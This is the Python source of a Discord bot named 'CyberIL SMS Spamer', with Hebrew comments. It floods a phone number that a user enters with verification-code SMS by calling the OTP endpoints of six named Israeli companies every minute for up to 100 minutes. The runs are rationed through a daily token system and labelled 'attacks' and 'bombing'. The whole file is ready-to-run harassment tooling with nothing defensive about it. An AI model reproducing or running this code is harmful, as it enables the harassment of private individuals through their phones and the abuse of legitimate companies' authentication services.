import discord
from discord import app_commands
from discord.ext import commands
import os
import requests
import asyncio
from datetime import datetime, timedelta

# הגדרות סביבה
TOKEN = os.getenv('DISCORD_TOKEN')
GSHEET_URL = os.getenv('GSHEET_URL')

# חסימת מספר ספציפי
BLOCKED_NUMBER = "0535524017"

# ניהול נתונים בזיכרון
user_tokens = {}  # {user_id: total_minutes}
user_cooldowns = {}  # {user_id: next_claim_time}
active_attacks = {}

class CyberBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        super().__init__(command_prefix="!", intents=intents)

    async def setup_hook(self):
        await self.tree.sync()

bot = CyberBot()

# --- פונקציות עזר ---
def get_balance(user_id):
    return user_tokens.get(user_id, 0)

def can_claim(user_id):
    if user_id not in user_cooldowns: return True
    return datetime.now() >= user_cooldowns[user_id]

# --- מנוע ה-API ---
def api_request(url, payload=None, method="POST", is_json=True):
    try:
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/json" if is_json else "application/x-www-form-urlencoded"
        }
        if method == "GET": r = requests.get(url, headers=headers, timeout=4)
        elif method == "PUT": r = requests.put(url, json=payload, headers=headers, timeout=4)
        else:
            if is_json: r = requests.post(url, json=payload, headers=headers, timeout=4)
            else: r = requests.post(url, data=payload, headers=headers, timeout=4)
        return r.status_code in [200, 201]
    except: return False

async def fire_round(phone):
    tasks = [
        # סלקום (חדש)
        asyncio.to_thread(api_request, "https://digital-api.cellcom.co.il/api/otp/LoginStep1", {"Subscriber": phone, "IsExtended": False, "ProcessType": "", "OtpOrigin": "main OTP"}, method="PUT"),
        # חמ"ל
        asyncio.to_thread(api_request, "https://users-auth.hamal.co.il/auth/send-auth-code", {"value": phone, "type": "phone", "projectId": "1"}),
        # משלוחה
        asyncio.to_thread(api_request, "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber", {"phoneNumber": phone}),
        # דומינוס
        asyncio.to_thread(api_request, "https://api.dominos.co.il/sendOtp", {"otpMethod": "text", "customerId": phone, "language": "he", "requestNum": 8}),
        # אייבורי
        asyncio.to_thread(api_request, f"https://www.ivory.co.il/user/login/sendCodeSms/temp@gmail.com/{phone}", method="GET"),
        # הופאון
        asyncio.to_thread(api_request, "https://api.hopon.co.il/v0.15/1/isr/users", {"clientKey": "11687CA9-2165-43F5-96FA-9277A03ABA9E", "countryCode": "972", "phone": phone, "phoneCall": False})
    ]
    results = await asyncio.gather(*tasks)
    return sum(results)

# --- לוגיקת הרצה ---
async def run_attack_logic(interaction, phone, minutes):
    uid = interaction.user.id
    if phone == BLOCKED_NUMBER:
        return await interaction.followup.send("🚫 המספר הזה חסום במערכת!", ephemeral=True)

    active_attacks[uid] = True
    end_time = datetime.now() + timedelta(minutes=minutes)
    
    await interaction.followup.send(f"⚔️ הפצצה החלה על {phone} למשך {minutes} דקות!", ephemeral=True)

    while datetime.now() < end_time and active_attacks.get(uid):
        if get_balance(uid) <= 0: break
        
        # הרצת פעימה
        await fire_round(phone)
        
        # הורדת זמן מהיתרה (דקה אחת בכל פעם שהלולאה רצה דקה, כאן נפחית כל פעימה חלק יחסי)
        # כדי לפשט: נוריד טוקן 1 כל דקה
        await asyncio.sleep(60) 
        user_tokens[uid] -= 1

    active_attacks.pop(uid, None)
    await interaction.followup.send(f"✅ ההפצצה על {phone} הסתיימה.", ephemeral=True)

# --- ממשק דיסקורד ---
class AttackControl(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="🚀 הפעל ספאמר", style=discord.ButtonStyle.danger)
    async def start_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        if get_balance(interaction.user.id) < 1:
            return await interaction.response.send_message("❌ אין לך מספיק טוקנים (דקות)! קח טוקן יומי.", ephemeral=True)
            
        class BombModal(discord.ui.Modal, title="CyberIL - שגר ושכח"):
            phone = discord.ui.TextInput(label="מספר טלפון", min_length=10, max_length=10)
            minutes = discord.ui.TextInput(label="כמה דקות? (1-100)", default="5")
            
            async def on_submit(self, modal_inter: discord.Interaction):
                try:
                    m = int(self.minutes.value)
                    if m > 100: m = 100
                    if m > get_balance(interaction.user.id):
                        return await modal_inter.response.send_message(f"❌ אין לך מספיק דקות! יש לך רק {get_balance(interaction.user.id)}", ephemeral=True)
                    
                    await modal_inter.response.defer(ephemeral=True)
                    asyncio.create_task(run_attack_logic(modal_inter, self.phone.value, m))
                except:
                    await modal_inter.response.send_message("נא להזין מספר תקין", ephemeral=True)

        await interaction.response.send_modal(BombModal())

    @discord.ui.button(label="🎁 קח 5 טוקנים (יומי)", style=discord.ButtonStyle.success)
    async def claim_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        uid = interaction.user.id
        if can_claim(uid):
            user_tokens[uid] = get_balance(uid) + 5
            user_cooldowns[uid] = datetime.now() + timedelta(hours=24)
            await interaction.response.send_message(f"✅ קיבלת 5 טוקנים! כל טוקן = דקה של ספאם. יתרה: {user_tokens[uid]}", ephemeral=True)
        else:
            await interaction.response.send_message("⏳ כבר לקחת היום. תחזור מחר!", ephemeral=True)

    @discord.ui.button(label="🛑 עצור הכל", style=discord.ButtonStyle.secondary)
    async def stop_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        active_attacks[interaction.user.id] = False
        await interaction.response.send_message("🚨 עוצר את כל הפעולות...", ephemeral=True)

# --- פקודות Slash ---

@bot.tree.command(name="spamer-setup", description="הצגת לוח הבקרה")
async def spamer_setup(interaction: discord.Interaction):
    embed = discord.Embed(title="⚡ CyberIL SMS Spamer", color=0xFF0000)
    embed.add_field(name="יתרת דקות (טוקנים)", value=f"`{get_balance(interaction.user.id)}`", inline=True)
    embed.add_field(name="הסבר", value="1 טוקן = 1 דקה של הפצצה רציפה.\nניתן להריץ עד 100 טוקנים במכה אחת.", inline=False)
    await interaction.response.send_message(embed=embed, view=AttackControl())

@bot.tree.command(name="spamer-givetokens", description="הענקת טוקנים למשתמש")
async def give_tokens(interaction: discord.Interaction, user: discord.Member, amount: int):
    user_tokens[user.id] = get_balance(user.id) + amount
    await interaction.response.send_message(f"🎁 הוענקו {amount} טוקנים (דקות) ל-{user.mention}.", ephemeral=True)

bot.run(TOKEN)
